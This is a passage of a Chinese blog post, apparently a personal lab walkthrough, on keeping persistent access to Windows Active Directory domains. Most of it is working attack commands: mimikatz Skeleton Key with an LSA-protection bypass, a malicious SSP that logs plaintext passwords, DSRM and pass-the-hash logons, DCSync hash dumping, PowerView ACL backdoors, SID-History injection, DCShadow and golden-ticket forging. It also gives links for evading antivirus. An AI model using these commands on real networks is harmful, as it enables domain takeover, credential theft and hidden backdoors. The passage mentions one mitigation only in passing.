+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p>就可以创建一个Skeleton Key域后门密码为mimikatz</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181126557.png"
+                      alt="image-20230820181126557"
+                ></p>
+<p>然后该域控就可以使用mimikatz登陆进去，原密码也还是有效的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181222523.png"
+                      alt="image-20230820181222523"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181252393.png"
+                      alt="image-20230820181252393"
+                ></p>
+<h6 id="2-缓解措施"><a href="#2-缓解措施" class="headerlink" title="2.缓解措施"></a>2.缓解措施</h6><p>微软对于这个问题在2014年3月添加了一个LSA保护策略（lsass作为受保护进程运行），可以执行命令开启&#x2F;关闭LSA</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\lSA&quot; /V RunAsPPL /T REG_DWORD /d 1 /f</span><br><span class="line">关闭</span><br><span class="line">reg delete &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL</span><br></pre></td></tr></table></figure></div>
+
+<p>开启后，mimikatz就会失效，都无法安装SkeletonKey</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181928443.png"
+                      alt="image-20230820181928443"
+                ></p>
+<p>但是！！</p>
+<p>早在2013年10月mimikatz就支持绕过LSA保护。该功能需要mimikatz中的mimidrv.sys文件，命令为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">           !+</span><br><span class="line">           !processprotect /process:lsass.exe /remove</span><br><span class="line">           misc::skeleton</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820182046923.png"
+                      alt="image-20230820182046923"
+                ></p>
+<h2 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h2><p>是目录服务还原模式，是Windows域环境中域控的安全模式启动选项。域控的本地管理员账户也就是DSRM账户，也就是他们的密码是一样的。</p>
+<p>每个DC上面都有一个名为Administrator的本地管理员，他的密码就是DSRM的密码</p>
+<p>服务器升级成域控的时候就需要DSRM密码（SafeModePassword），而且很少更改</p>
+<p>修改DC的配置后，可以通过该用户的NTLM hash访问DC</p>
+<p>用途：允许管理员在域环境出现故障时还原，修复，重建活动目录数据库。通过在DC上运行ntdsutil工具可以修改DSRM 的密码</p>
+<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p>系统要求：在安装了KB961320补丁的Windows Server 2008之后的Windows版本开始支持在DC上使用指定的域账户同步DSRM密码</p>
+<p>更改DSRM的密码方式：同步域用户的方式</p>
+<p>更改密码指令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#进入ntdsutil</span><br><span class="line">ntdsutil</span><br><span class="line">#修改DSRM的密码</span><br><span class="line">set DSRM password</span><br><span class="line">#使DSRM的密码和指定域用户的密码同步 eg:sync from domain account [域用户名]</span><br><span class="line">sync from domain account webadmin</span><br><span class="line">#退出</span><br><span class="line">按两次q即可退出(第1次：退出DSRM密码设置模式;第2次退出ntdsutil)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>需要一个域账户hash</p>
+<p>并且需要注意是否会同步域账户（同步DSRM账户后，后门即失效）</p>
+<p>域控重启后会失效</p>
+<h3 id="操作演示"><a href="#操作演示" class="headerlink" title="操作演示"></a>操作演示</h3><p>获取DSRM以及krbtgt的NTLM hash（就是域管hash信息）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::Debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820183251903.png"
+                      alt="image-20230820183251903"
+                ></p>
+<p>更改登陆方式</p>
+<p>修改DSRM登陆方式</p>
+<p>有三种登陆方式</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</span><br><span class="line">1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</span><br><span class="line">2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</span><br></pre></td></tr></table></figure></div>
+
+<p>执行修改为2表示任何情况下都可以使用DSRM账号登陆域控制器</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注册表命令</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /f /v DSRMaDMINlOGONbEHAVIOR /T reg_dword /d 2</span><br><span class="line">#powershell命令</span><br><span class="line">New-Itempeoperty &quot;hklm:\system\currentcontrolset\control\lsa&quot; -name &quot;dsrmadinlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820183310906.png"
+                      alt="image-20230820183310906"
+                ></p>
+<p>然后就可以域内主机使用psexec.exe进行连接</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe hack-my.com/Administrator@192.168.30.10 -hashes :38fe728ae616f0fde13715e7c320685f</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184145688.png"
+                      alt="image-20230820184145688"
+                ></p>
+<p>PTH传递攻击</p>
+<p>然后就可以使用mimikatz进行（在域成员机器的管理员模式下打开）使用pth创建会话</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /domain:DC /user:administrator /ntlm:38fe728ae616f0fde13715e7c320685f</span><br></pre></td></tr></table></figure></div>
+
+<p>就可以达到权限维持的目的，即使被关闭，也可以再次通过PTH重新调用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184756227.png"
+                      alt="image-20230820184756227"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184852000.png"
+                      alt="image-20230820184852000"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820185031985.png"
+                      alt="image-20230820185031985"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820185050596.png"
+                      alt="image-20230820185050596"
+                ></p>
+<h2 id="自定义安全支持提供程序SSP"><a href="#自定义安全支持提供程序SSP" class="headerlink" title="自定义安全支持提供程序SSP"></a>自定义安全支持提供程序SSP</h2><p>安全支持提供程序（SSP）是一个DLL，为应用程序提供获取经过身份验证的连接的方法，微软的一些SSP包包含了：NTLM Kerbeos Wdigest CredSSP</p>
+<p>mimikatz提供了一个自定义SSP-mimilib.dll</p>
+<p>SSP入职从计算机的下一次重启开始。此SSP以明文形式在目标服务器上记录本地登录、服务账号和计算机账户密码</p>
+<p>凭证的保存路径：C:\Windows\System32\kiwissp.log</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">实现免杀</span><br><span class="line">https://xz.aliyun.com/t/8268</span><br><span class="line">https://xz.aliyun.com/t/8323</span><br></pre></td></tr></table></figure></div>
+
+<p>方法一</p>
+<p>将mimilib.dll拖放到system32并将mimilib添加到注册表</p>
+<p>但是这个操作是需要修改注册表的，会比较麻烦，且无法远程执行交互式命令，所以就需要远程登陆到对方的主机中来进行执行</p>
+<p>优点：永久生效，但是需要重启服务器</p>
+<p>将mimikatz中的mimilib.dll上传到目标主机的C:\windows\system32\目录下（注意需要上传对应位数的文件）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820204725258.png"
+                      alt="image-20230820204725258"
+                ></p>
+<p>命令修改</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看当前注册表中的设置值</span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot;</span><br><span class="line">#修改注册表中的值</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#CS中修改注册表中的值</span><br><span class="line">shell echo yes | reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820204806604.png"
+                      alt="image-20230820204806604"
+                ></p>
+<p>然后重启服务器后会在C:\windows\system32\kiwissp.log记录密码信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205114094.png"
+                      alt="image-20230820205114094"
+                ></p>
+<p>这种方法得重启服务器，有风险</p>
+<p>方法二</p>
+<p>使用mimikatz，注入lsass</p>
+<p>可以使用mimikatz直接进行命令执行，执行后只要等待管理员重新登陆就行了，但是该命令是一次性的，当这台服务器重启之后，那么这条命令就无法再次执行了，详单与重启就失效了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205152872.png"
+                      alt="image-20230820205152872"
+                ></p>
+<p>只要管理员重新登陆就行了</p>
+<p>这时候就会在C:\Windows\System32\mimilsa.log获取到登陆的日志，里面会记录着登陆的密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205226633.png"
+                      alt="image-20230820205226633"
+                ></p>
+<h2 id="访问控制列表ACL-AdminSDHolder"><a href="#访问控制列表ACL-AdminSDHolder" class="headerlink" title="访问控制列表ACL-AdminSDHolder"></a>访问控制列表ACL-AdminSDHolder</h2><p>AdminSDHolder是位于AD中的系统分区（cn&#x3D;admin）</p>
+<p>先得创建一个域用户（得带域前缀，不然是本地账户）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user abc.com\user1 /add</span><br></pre></td></tr></table></figure></div>
+
+<p>添加ACL</p>
+<p>删除ACL</p>
+<p>手动运行SDProp服务（会一小时执行一次，也可以等）</p>
+<p>win2008命令不一样</p>
+<p>然后就可以滥用通用访问和完全控制</p>
+<p>修改域管组成员</p>
+<p>修改域管密码</p>
+<p>还可以有更多有趣的ACL可以被滥用。如运行DCSync的能力</p>
+<p>域管给域用户添加ACL</p>
+<p>执行DCSync</p>
+<h2 id="SID-History"><a href="#SID-History" class="headerlink" title="SID-History"></a>SID-History</h2><p>SID即安全标识符，是标识用户、组和计算机账户的唯一号码。SID会在第一次创建账号的时候创建，并且这个SID是唯一的</p>
+<p>SIDHistory是为了解决用户在迁移到另一个域的时候权限会改变的问题。比如nihao用户在A域中是域管，但是迁移到B域的时候有时候由于SID值的改变会导致变成普通用户，这时候只要给nihao用户添加一个在A域的SIDHistory值就可以解决这个问题</p>
+<p>注意：只有域管有更改SIDHistory的权利</p>
+<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>获取所有用户的SID值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure></div>
+
+<p>查看可以知道SID只有后四位是不同的，这里也代表着不同的权限</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205254523.png"
+                      alt="image-20230820205254523"
+                ></p>
+<p>获取某个用户的SID值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#利用powershell执行</span><br><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser boy -Properties sidhistory</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>赋予某个用户administrator权限</p>
+<p>这里赋予boy权限，也就是将administrator的SID值导入boy的SID-History中</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#利用mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:boy /new:administrator</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820210219148.png"
+                      alt="image-20230820210219148"
+                ></p>
+<p>报错了，这个查看了一下是mimkatz版本的原因，网上说尝试更换旧版本2.1.1解决，但是更换了还是不行</p>
+<p>查看boy的SID值看是否具备administrator权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser boy -Properties sidhistory</span><br></pre></td></tr></table></figure></div>
+
+<p>这边就可以正常访问域控中的资源了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.30.10\c$</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>总结：这个方法只要不去修改域账号就一直有效的，在域控的用户中心中是无法查询到变化的，隐蔽性较高	</p>
+<h3 id="利用AdminSDHolder打造域后门"><a href="#利用AdminSDHolder打造域后门" class="headerlink" title="利用AdminSDHolder打造域后门"></a>利用AdminSDHolder打造域后门</h3><p>AdminSDHolder是一个特殊的AD容器对象，位于Domain NC的system容器下</p>
+<p>一般作为某些受保护对象的安全模板，防止这些对象遭受恶意的修改或者滥用</p>
+<p>受保护对象通常包括特权用户和受保护的组，Administrator、Domain Admins、Enterprise Admin以及Schema Admins等</p>
+<p>在活动目录中用adminCount用来标记特权用户和组，通常特权用户和组属性被设为1</p>
+<p>通过AdFind查询adminCount属性设置为1的对象，可以找到所有受AdminSDHolder保护的特权和组</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">列举受保护的用户</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=person)(samaccountname=*)(admincount=1)&quot; -dn</span><br><span class="line">列举搜保护的组</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820213056794.png"
+                      alt="image-20230820213056794"
+                ></p>
+<p>默认下，系统会定期检查（60分钟）受保护对象的安全描述符，将受保护对的ACL和AdminSDHolder的ACL相比较，如果不一致将会强制修改为AdminSDHolder的ACL（通过SDProp进程来完成检查）</p>
+<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p>思路：可以篡改AdminADHolder的ACL配置，然后60分钟后SDPorp调用将会强制改变受保护对象的ACL，以此建立一个隐蔽的后门，需要域管理员权限</p>
+<p>执行命令，通过powerView向AdminSDHolder容器添加一个ACL，使普通的域用户拥有对AdminSDHolder的完全控制权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820215120175.png"
+                      alt="image-20230820215120175"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820214934231.png"
+                      alt="image-20230820214934231"
+                ></p>
+<p>等60分钟让SDProp生效，也可以用指令使其时间缩短，这个时候boy用户就可以向Domain Admins等关键用户组成员添加成员</p>
+<p>清除这个权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity boy -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="HOOK-PasswordChangeNotify"><a href="#HOOK-PasswordChangeNotify" class="headerlink" title="HOOK PasswordChangeNotify"></a>HOOK PasswordChangeNotify</h3><p>PasswordChangeNotify这个东西是windows中为了重置密码，windows会检查新密码的复杂性是否够安全，如果符合要求LSA就会调用它在系统中同步密码</p>
+<p>调用的过程中密码是明文传输，所以可以利用KOOK技术在调用过程中劫持密码</p>
+<p>主要就是利用域用户更改密码的时候进行利用的</p>
+<p>函数PasswordChangeNotify存在于rassfm.dll中，该dll可以理解为Remote Access Subauthentication Dll(远程访问子系统认证)，只存在于Server系统中。可以利用dumpbin查看rassfm.dll导出函数来验证</p>
+<h3 id="DCSync技术"><a href="#DCSync技术" class="headerlink" title="DCSync技术"></a>DCSync技术</h3><h3 id="利用DCSync导出域内hash"><a href="#利用DCSync导出域内hash" class="headerlink" title="利用DCSync导出域内hash"></a>利用DCSync导出域内hash</h3><p>在一个域环境中可以有多台域控，每台域控各自存储着一份所在域的活动目录的可写副本</p>
+<p>对目录的任何修改都可以从源域控中同步到其他域控中</p>
+<p>当一个域控想从其他域控获取数据时，客户端域控会向服务端域控获取DSGetNCChanges请求，这个请求的响应包含着更新</p>
+<p>一般15分钟会有一次域同步</p>
+<p>DCSync就是利用域控同步原理，通过Directory Replication Service服务的IDL——DRSGetNCChanges接口向域控发起请求</p>
+<p>可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控的数据</p>
+<p>注意：此攻击并不适用于只读域控（RODC）</p>
+<h4 id="mimikatz下的利用"><a href="#mimikatz下的利用" class="headerlink" title="mimikatz下的利用"></a>mimikatz下的利用</h4><p>mimikatz在2015年8月更新中添加了DCSync功能</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">导出域内指定用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /user:hack-my\administrator&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325162902673.png"
+                      alt="image-20230325162902673"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">导出域内所有用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163104824.png"
+                      alt="image-20230325163104824"
+                ></p>
+<p><code>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163210977.png"
+                      alt="image-20230325163210977"
+                ></p>
+<h4 id="Impacket下的利用"><a href="#Impacket下的利用" class="headerlink" title="Impacket下的利用"></a>Impacket下的利用</h4><p>Impacket中的secretsdump.py可以支持DCSync技术导出域控中的用户哈希</p>
+<p>该工具可以使用高权限用户的密码来实现从域外主机读取域内主机的hash值，同时可以通过Dcsync或卷影复制的方法，NTDS.dit的中导出所有用户的hash值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py hack-my.com/administrator(账号):Admin!@#45(密码)@192.168.81.140(域控IP) -just-dc-user &quot;hack-my\administrator&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>导出域管理员Administrator用户的hash值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325165120864.png"
+                      alt="image-20230325165120864"
+                ></p>
+<h3 id="利用DCSync维持域内权限"><a href="#利用DCSync维持域内权限" class="headerlink" title="利用DCSync维持域内权限"></a>利用DCSync维持域内权限</h3><p>在获取域管理员权限之后，可以手动为域内标准用户赋予DCSync操作权限，从而实现隐蔽发域后门</p>
+<p>通过powershell中的PowerView.ps1脚本实现</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">为域用户Alice添加DCSync权限</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821111406479.png"
+                      alt="image-20230821111406479"
+                ></p>
+<p>添加成功后可以通过Alice用户导出域内用户的哈希</p>
+<p><code>python3 secretsdump.py hack-my.com/administrator:Admin\!\@\#45@192.168.81.141 -just-dc-user &quot;hack-my\administrator&quot;</code></p>
+<p>这边我直接使用mimikatz执行操作</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:hack-my.com /all /csv</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821111827314.png"
+                      alt="image-20230821111827314"
+                ></p>
+<p>清除权限</p>
+<p><code>Remove-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</code></p>
+<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadow技术同样利用了域控之间的DRS数据同步</p>
+<p>但是它与DCSync思路相反</p>
+<p>它是利用创建一个恶意的域控，利用域控之间的同步复制，将预先设定的对象和对象属性注入正在运行的合法域控中，以此来创建域后门等</p>
+<p>通过DCShadow修改普通域用户Alice来演示攻击原理</p>
+<p>前文已经知道，将用户的primaryGroupID改为512，可以然用户成为域管理员</p>
+<p>RID是指相对标识符，时SID的一部分，通常在SID字符串的末端。</p>
+<p>windows使用SID来区分用户账户和组的</p>
+<h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>1.在任意注意中运行mimkatz并执行以下命令，创建恶意域控</p>
+<p><code>mimikatz.exe &quot;lsadump::dcshadow /object:CN=Alice,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512&quot; exit</code></p>
+<p>2.第一个命令窗口不要关，重新打开一个，强制触发域复制，将数据更改推送至合法域控制器</p>
+<p><code>mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325173750046.png"
+                      alt="image-20230325173750046"
+                ></p>
+<p>也可以使用黄金票据+dcshadow进行</p>
+<p>黄金票据是可以进行DCShadow需要注意的ldap的域管白银票据是不行的因为rpc需要TGT的认证,<br>        因此只能黄金票据+DCShadow。</p>
+<p>​		打开新的mimikatz导入黄金票据:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:boy（这个可以随便取） /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /krbtgt:3240a50b789addc29388d03988e89209 /ticket:1.kirbi</span><br></pre></td></tr></table></figure></div>
+
+<p>​		进行同步:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcshadow /push</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p> 按理来说这时候Alice已经是域管理员组的用户了，但不知道为啥我成功不了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325175329381.png"
+                      alt="image-20230325175329381"
+                ></p>
+<p>烦死</p>
+<p>DCShadow使得测试人员可以直接修改活动目录数据库中的对象</p>
+<p>域防护比较严的情况下，可以利用DCShadow操控SID History、Krbtgt账户的密码，或者将用户添加到特权组，实现域权限持久化</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 权限维持---域环境</li>
